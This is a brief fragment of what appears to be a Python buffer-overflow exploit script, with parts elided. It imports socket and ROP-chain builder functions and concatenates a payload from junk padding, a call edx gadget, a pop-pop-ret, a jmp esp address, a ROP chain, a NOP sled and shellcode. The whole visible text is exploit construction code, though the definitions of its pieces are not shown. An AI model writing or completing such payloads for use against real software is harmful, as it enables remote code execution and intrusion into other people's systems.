...
import socket,sys
import os
from create_rop import create_rop_chain
from create_rop import create_rop_chain2
...
rop_chain = create_rop_chain2()
payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + rop_chain + nopsled + shellcode
